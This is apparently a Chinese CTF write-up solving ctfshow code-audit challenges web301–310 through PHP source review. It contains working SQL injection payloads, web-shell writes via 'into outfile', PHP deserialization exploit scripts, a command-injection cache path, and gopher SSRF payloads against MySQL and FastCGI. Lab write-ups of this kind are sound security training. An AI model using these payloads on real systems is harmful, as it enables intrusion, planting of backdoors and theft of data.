---
title: Web入门_代码审计
author: Creexile
date: 2024-10-08 22:56:49
lastMod: 2025-04-10
summary: 'web301-310'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [MySQL, PHP, 代码审计, 工具, CTF]
---

# 代码审计

## web301

- 描述: 审计审计我三年前写的代码

`checklogin.php`中存在sql注入:

```php
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
```

而且结合查看`logout.php`, 发现鉴权方式只有login是否为1, 可能有未授权

所以sql登录方式如下:

```
POST:
userid=1'union select 1#&userpwd=1

userid=-1' union select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/shell.php"#&userpwd=1
```

未授权: 将cookie改成`login=1`

![image-20240922104458895](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922104458895.png)

## web302

描述: `if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){`

未授权没了

全局搜索sds_decode, 在`fun.php`中找到解密函数

```php
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
?>
```

为什么我检查`checklogin.php`依然没变下面这个, 不过无所谓了, 就用上面那个

利用下面的代码进行本地运行

```php
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
echo sds_decode('1');
?>
# d9c77c4e454869d5d8da3b4be79694d3
```

payload:

```
userid=1'union select 'd9c77c4e454869d5d8da3b4be79694d3'#&userpwd=1
```

## web303

`checklogin.php`增加了限制:

```php
if(strlen($username)>6){
	die();
}
```

`sds_user.sql`给出账号admin和加密后密码, 试出来账号密码都是admin. 但是没给flag

回到代码审计, 在dpt.php中找到注释: `//注入点`, 发现`dptadd.php`中也有

```php
# dpt.php, 没有可控参数, 压根就是假的
<?php
    //注入点
    $_GET['id']=!empty($_GET['id'])?$_GET['id']:NULL;
    $page=$_GET['id'];

    $sql="select * from sds_dpt order by id;";
    $result=$mysqli->query($sql);
?>
```

![image-20240922115507261](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922115507261.png)

`die(mysqli_error($mysqli));`长期速逝导致的报错注入, 以及插入查询

刚好我们已经登录了, 记得登录后添加数据

```
POST:
# 查当前数据库: sds
dpt_name=-1' and updatexml(1,concat('~',database()),3)#
# 查数据库表: sds_dpt,sds_fl9g,sds_user
dpt_name=-1' and updatexml(1,concat('~',substr((select group_concat(table_name)from information_schema.tables where table_schema = database()), 1 , 31)),3)#
# 查表内字段: flag
dpt_name=-1' and updatexml(1,concat('~',substr((select group_concat(column_name)from information_schema.columns where table_name = 'sds_fl9g'), 1 , 31)),3)#
# 获取表内信息: ctfshow{d04dd568-5e60-43b3-8298-5304f1c332f1}
dpt_name=-1'and updatexml(1,concat('~',substr((select flag from sds_fl9g),1,31)),3)#
dpt_name=-1'and updatexml(1,concat('~',substr((select flag from sds_fl9g),31,50)),3)#
```

![image-20240922181423719](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922181423719.png)

再来看看insert注入, 然后刷新就能在浏览器里面看到结果

```
# 查表
dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
# 查字段
dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_name='sds_fl9g');#
# 查数据
dpt_name=1',sds_address=(select flag from sds_fl9g)#
```

![image-20240922181932570](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922181932570.png)

## web304

- 描述: 增加了全局waf

```php
function sds_waf($str){
	return preg_match('/[0-9]|[a-z]|-/i', $str);
}
```

反正源码还是上一题的, 甚至上一题的两个方法也能用, 懒得写了

## web305

- 描述: 代码地址

这次是真过滤了, 新增在`fun.php`

```php
function sds_waf($str){
	if(preg_match('/\~|\`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\{|\}|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\<|\>/', $str)){
		return false;
	}else{
		return true;
	}
}
```

新增了`class.php`, 似乎是一个反序列化:

```php
class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
}
```

查看谁引用了这个文件, 发现是`checklogin.php`中有反序列化操作

```php
$user_cookie = $_COOKIE['user'];
if(isset($user_cookie)){
	$user = unserialize($user_cookie);
}
```

那就很简单了, 构造反序列化然后通过cookie传入即可, exp如下:

```php
<?php
class user{
	public $username='1.php';
	public $password='<?php eval($_POST[1]);?>';
}
$a = new user();
echo urlencode(serialize($a));
?>
# O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D
```

![image-20240922194816615](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922194816615.png)

然后访问`1.php`执行命令即可

flag在数据库中, 可以利用蚁剑的数据库操作:

首页右键连接成功的条目, 选择数据操作

先检测数据库函数支持(本题为Mysqli), 然后配置连接, 密码在`conn.php`中, 执行查询语句即可

![image-20240922200152501](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240922200152501.png)

## web306

- 描述: 开始使用mvc结构

在`index.php`有一个反序列化

```php
<?php
session_start();
require "conn.php";
require "dao.php";
$user = unserialize(base64_decode($_COOKIE['user']));
if(!$user){
    header("location:login.php");
}
?>
```

`conn.php`是连接mysql数据库用的, 没内容

`dao.php`引入`class.php`, 该文件中有`file_put_contents()`, 可以用于写文件

```php
class log{
	public $title='log.txt';
	public $info='';
	public function loginfo($info){
		$this->info=$this->info.$info;
	}
	public function close(){
		file_put_contents($this->title, $this->info);
	}
}
```

所以可以通过`dao.php`触发写文件操作, 而index.php刚好引入了`dao.php`, 反序列化链如下

> index -> dao::\_\_destruct() -> log::close()

写payload

```php
<?php
class log{
    public $title = '1.php';
    public $info = '<?php eval($_POST[1]);?>';
}

class dao{
    private $conn;
    public function __construct($conn){
        $this->conn=$conn;
    }
}

$s = new dao(new log());
echo base64_encode(serialize($s));
//# TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319
```

利用hackbar直接对`index.php`发包并设置cookie的user值为上面的输出

![image-20241007215401537](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241007215401537.png)

然后在当前目录下找到flag

```
POST:
1=system('tac flag.php');
```

## web307

- 描述: 是不是顺眼多了

现在反序列化的入口出现在了`cotroller/logout.php`, 而且没有身份认证

```php
<?php
// 省略一些东西
require 'service/service.php';

setcookie('user','',0,'/');
$service = unserialize(base64_decode($_COOKIE['service']));
if($service){
	$service->clearCache();
}
?>
```

查询该函数, 发现在`cotroller/service/dao/dao.php`中存在, 而且该函数直接调用的shell_exec

在参数可控的情况下, 可以利用分号阻断前面命令, 执行我们的命令

```php
class dao{
	private $config;

	public function __construct(){
		$this->config=new config();    # 接下, 那就只能去config.php了
		$this->init();

	public function  clearCache(){
		shell_exec('rm -rf ./'.$this->config->cache_dir.'/*');    # 明显是删掉这个路径, 这个路径不在class.php
	}
```

`cotroller/service/dao/config/config.php`中有路径设置:

```php
class config{
	private $mysql_username='root';
	private $mysql_password='phpcj';
	private $mysql_db='sds';
	private $mysql_port=3306;
	private $mysql_host='localhost';
	public $cache_dir = 'cache';
        # ...
}
```

那么利用链就出来了

> logout -> config -> dao::clearCache()

```php
<?php
class config{
    public $cache_dir = '; echo "<?php eval(\$_POST[1]);?>" > 1.php; ' ;  这里需要转义$符
}

class dao{
    private $config;

    public function __construct(){
        $this->config=new config();
    }
}

$s = new dao();
echo base64_encode(serialize($s));
# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjsgZWNobyAiPD9waHAgZXZhbChcJF9QT1NUWzFdKTs/PiIgPiAxLnBocDsgIjt9fQ==
```

注意生成的文件在`/controller/1.php`

![image-20241007224857190](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241007224857190.png)

```
POST:
1=system('tac ../flag.php');
```

## web308

- 描述: 需要拿shell

之前的`cache_dir`添加了正则过滤, 只允许字母通过, 看起来是不能利用了

在`index.php`中有反序列化入口

> 我的建议是直接全局搜索 unserialize, 排查可以访问到的文件

```php
<?php
$service = unserialize(base64_decode($_COOKIE['service']));
if($service){
    $lastVersion=$service->checkVersion();
}
?>
```

再找这个方法来自哪里, 来自`dao.php`

```php
public function checkVersion(){
	return checkUpdate($this->config->update_url);
}
```

再找checkUpdate, 来自`fun.php`, 这里存在ssrf:

- 传入的url没有经过任何过滤
- `CURLOPT_SSL_VERIFYPEER`设置为`false`禁用了对SSL证书颁发机构的验证
- `CURLOPT_SSL_VERIFYHOST`设置为`false`禁用了对主机名的验证

```php
function checkUpdate($url){
		$ch=curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		$res = curl_exec($ch);
		curl_close($ch);
		return $res;
	}
```

> index -> dao::checkVersion() -> fun::checkUpdate

这里写不了马, 那就看看数据库能不能利用: 找到config.php文件, 发现没有密码

利用gopher协议和mysql数据库攻击, 现成的工具(必须没有密码): [Gopherus](https://github.com/tarunkant/Gopherus)

```bash
python2 .\gopherus.py --exploit mysql
root
select '<?=eval($_POST[1])?>' into outfile '/var/www/html/1.php';
```

![image-20241008220507854](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241008220507854.png)

然后利用反序列化链即可

```php
<?php
class config{
	public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%42%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%3d%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%3b%01%00%00%00%01';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo base64_encode(serialize($a));
?>
# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NTE6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDIlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjclM2MlM2YlM2QlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2YlM2UlMjclMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjclMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjclM2IlMDElMDAlMDAlMDAlMDEiO319
```

最后payload:

```
POST:
1=system('tac flaaaaaag.php');
```

## web309

- 描述: 需要拿shell，308的方法不行了,mysql 有密码了

上一题利用链都没变, 只改了密码, 这里是利用SSRF漏洞攻击FastCGI

> 前置条件:
>
> - PHP版本大于5.3.3, 此时才能修改PHP.INI
> - 知道一个PHP文件的绝对路径
> - PHP_FRM监听本机9000

没学明白, 后面再写一个复现, 就先当脚本小子: 一样用上面那个工具

> 这里可以替换`tac f*`为`echo "<?=eval(\$_POST[1])?>" >1.php`

```bash
python2 .\gopherus.py --exploit fastcgi
index.php
tac f*
```

![image-20241008222458775](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241008222458775.png)

```php
<?php
class config{
	public $update_url = 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27tac%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo base64_encode(serialize($a));
?>
# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo1NzU6ImdvcGhlcjovLzEyNy4wLjAuMTo5MDAwL18lMDElMDElMDAlMDElMDAlMDglMDAlMDAlMDAlMDElMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlRjYlMDYlMDAlMEYlMTBTRVJWRVJfU09GVFdBUkVnbyUyMC8lMjBmY2dpY2xpZW50JTIwJTBCJTA5UkVNT1RFX0FERFIxMjcuMC4wLjElMEYlMDhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMSUwRSUwMkNPTlRFTlRfTEVOR1RINTglMEUlMDRSRVFVRVNUX01FVEhPRFBPU1QlMDlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUlMjAlM0QlMjBPbiUwQWRpc2FibGVfZnVuY3Rpb25zJTIwJTNEJTIwJTBBYXV0b19wcmVwZW5kX2ZpbGUlMjAlM0QlMjBwaHAlM0EvL2lucHV0JTBGJTA5U0NSSVBUX0ZJTEVOQU1FaW5kZXgucGhwJTBEJTAxRE9DVU1FTlRfUk9PVC8lMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlMDAlMDAlMDAlMDElMDUlMDAlMDElMDAlM0ElMDQlMDAlM0MlM0ZwaHAlMjBzeXN0ZW0lMjglMjd0YWMlMjBmJTJBJTI3JTI5JTNCZGllJTI4JTI3LS0tLS1NYWRlLWJ5LVNweUQzci0tLS0tJTBBJTI3JTI5JTNCJTNGJTNFJTAwJTAwJTAwJTAwIjt9fQ==
```

抓包, 发包即可

![image-20241008223338228](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241008223338228.png)

## web310

- 描述: 代码审计告一段落

利用web309的方法依然可以获得shell, 但是拿不到真的flag

利用链没变, 但是端口关了, 那就利用`file:///`协议读取一下配置文件

> 你说是不是可以在shell里面直接读配置文件`nginx.conf`, 懒得出去截图了

```php
<?php
class config{
	public $update_url = 'file:///etc/nginx/nginx.conf';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo base64_encode(serialize($a));
?>
# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyODoiZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZiI7fX0=
```

![image-20241008225357967](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241008225357967.png)

发现监听了4476端口, 初始目录是`/var/flag`, flag就在这个路径下面的`index.php`
